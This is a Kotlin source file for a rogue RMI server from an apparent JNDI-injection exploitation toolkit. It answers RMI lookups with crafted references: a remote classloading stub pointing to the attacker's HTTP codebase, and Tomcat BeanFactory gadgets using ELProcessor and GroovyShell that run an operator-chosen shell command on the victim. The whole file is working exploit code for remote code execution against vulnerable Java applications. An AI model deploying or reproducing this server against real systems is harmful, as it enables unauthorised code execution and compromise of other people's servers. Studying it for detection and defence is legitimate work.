import com.sun.jndi.rmi.registry.ReferenceWrapper
import org.apache.naming.ResourceRef
import sun.rmi.server.UnicastServerRef
import sun.rmi.transport.TransportConstants
import util.*
import java.io.*
import java.net.URL
import java.net.URLClassLoader
import java.rmi.server.ObjID
import java.rmi.server.RemoteObject
import java.rmi.server.UID
import javax.naming.Reference
import javax.naming.StringRefAddr

class RMIServer {
    private val port = Options.rmiPort
    private val command = Options.command
    private val codebase = URL("http://${Options.address}:${Options.httpPort}/")

    fun run() {
        println("[RMI] Listening on 0.0.0.0:$port".blue())

        val server = java.net.ServerSocket(port)

        while (true) {
            val socket = server.accept().apply { soTimeout = 5000 }
            println("${currentTime()} [RMI] Receive a connection from ${socket.remoteSocketAddress}")

            val input = socket.getInputStream()
            // guaranteed to support mark/reset
            val bis = if (input.markSupported()) input else BufferedInputStream(input)
            bis.mark(4)

            try {
                val dis = DataInputStream(bis)
                val magic = dis.readInt()
                val version = dis.readShort()
                if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                    socket.close()
                    continue
                }

                val output = socket.getOutputStream()
                val dos = DataOutputStream(BufferedOutputStream(output))

                when (dis.readByte()) {
                    TransportConstants.StreamProtocol -> {
                        dos.run {
                            // acknowledging support for the protocol
                            writeByte(TransportConstants.ProtocolAck.toInt())
                            // EndpointIdentifier (hostname and port)
                            writeUTF(socket.inetAddress.hostName)
                            writeInt(socket.port)
                            flush()
                        }

                        // read EndpointIdentifier from client
                        dis.readUTF()
                        dis.readInt()

                        parseMessage(dis, dos)
                    }
                    TransportConstants.SingleOpProtocol -> parseMessage(dis, dos)
                    TransportConstants.MultiplexProtocol -> {
                        println("${currentTime()} [RMI] MultiplexProtocol is unsupported".red())
                        socket.close()
                        continue
                    }
                    else -> {
                        println("${currentTime()} [RMI] Unknown protocol".red())
                        socket.close()
                        continue
                    }
                }
            } catch (e: Exception) {
                println("${currentTime()} [RMI] Something wrong, closing connection".red())
                socket.close()
            }
        }
    }

    /**
     * Parsing message wrapped within SingleOpProtocol.
     * The SingleOpProtocol is used for invocation embedded in HTTP requests.
     */
    private fun parseMessage(input: DataInputStream, output: DataOutputStream) {
        println("${currentTime()} [RMI] Reading message...")

        when (val op = input.readByte()) {
            TransportConstants.Call -> doRMICall(input, output)
            TransportConstants.Ping -> output.writeByte(TransportConstants.PingAck.toInt())
            TransportConstants.DGCAck -> UID.read(input)
            else -> throw IOException("${currentTime()} [RMI] Unknown transport op: $op")
        }
    }

    private fun doRMICall(input: DataInputStream, output: DataOutputStream) {
        val ois = object : ObjectInputStream(input) {
            override fun resolveClass(desc: ObjectStreamClass): Class<*> {
                return when (desc.name) {
                    "[Ljava.rmi.jndi.ObjID;" -> Array<ObjID>::class.java
                    "java.rmi.jndi.ObjID" -> ObjID::class.java
                    "java.rmi.jndi.UID" -> UID::class.java
                    "java.lang.String" -> String::class.java
                    else -> throw IOException("${currentTime()} [RMI] Not allowed to read object")
                }
            }
        }

        when (ObjID.read(ois).hashCode()) {
            2 -> handleDGC(ois)
            0 -> handleRMI(ois, output)
        }
    }

    private fun handleRMI(ois: ObjectInputStream, dos: DataOutputStream) {
        val method = ois.readInt()
        ois.readLong()

        if (method != 2) return

        val path = ois.readObject() as String

        dispatch(path, dos)
    }

    /**
     * Write payload into output stream based on path
     */
    private fun dispatch(path: String, dos: DataOutputStream) {
        val rmiKey = path.substringBefore("/")
        val httpKey = path.substringAfter("/")

        dos.writeByte(TransportConstants.Return.toInt())
        val mos = MarshalOutputStream(dos, URL("$codebase#$httpKey")).apply {
            writeByte(TransportConstants.NormalReturn.toInt())
            UID().write(this)
        }

        val ref: Reference = when (rmiKey) {
            "ref" -> {
                println("${currentTime()} [RMI] Sending remote classloading stub ($httpKey)")
                execByRemoteRef(httpKey)
            }
            "tomcat" -> {
                println("${currentTime()} [RMI] Sending local classloading reference")
                execByEL()
            }
            "groovy" -> {
                println("${currentTime()} [RMI] Sending local classloading reference")
                execByGroovy()
            }
            else -> throw IOException("${currentTime()} [RMI] Payload type not found")
        }

        val refWrapper = Reflection.createWithoutConstructor(ReferenceWrapper::class.java)
        Reflection.setFieldValue(refWrapper, "wrappee", ref)

        // set the ref attribute of the wrapper
        RemoteObject::class.java.getDeclaredField("ref").run {
            isAccessible = true
            set(refWrapper, UnicastServerRef(12345))
        }

        mos.writeObject(refWrapper)
        mos.flush()
        dos.flush()
    }

    private fun execByRemoteRef(mapping: String) =
        Reference("foo", mapping, "$codebase#$mapping")

    private fun execByEL() =
        ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null).apply {
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            add(StringRefAddr("forceString", "x=eval"))
            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
            add(
                StringRefAddr(
                    "x", """
                    |"".getClass()
                    |.forName("javax.script.ScriptEngineManager")
                    |.newInstance()
                    |.getEngineByName("JavaScript")
                    |.eval("java.lang.Runtime.getRuntime().exec('$command')")"""
                        .trimMargin().replace("\n", "")
                )
            )
        }

    private fun execByGroovy() =
        ResourceRef(
            "groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null
        ).apply {
            add(StringRefAddr("forceString", "x=evaluate"))
            add(StringRefAddr("x", "'${base46cmd(command)}'.execute()"))
        }

    private fun handleDGC(oiStream: ObjectInputStream) {
        oiStream.readInt()
        oiStream.readLong()
        println("${currentTime()} [RMISERVER]>> A DGC call for ${oiStream.readObject() as Array<*>}")
    }
}

class MarshalOutputStream(stream: OutputStream, val url: URL?) : ObjectOutputStream(stream) {
    override fun annotateClass(cl: Class<*>?) {
        if (url != null) {
            writeObject(url.toString())
        } else if (cl?.classLoader !is URLClassLoader) {
            writeObject(null)
        } else {
            val urls = (cl.classLoader as URLClassLoader).urLs
            val sum = urls.fold("") { sum, url ->
                sum + url.toString()
            }
            writeObject(sum)
        }
    }

    override fun annotateProxyClass(cl: Class<*>?) {
        annotateClass(cl)
    }
}
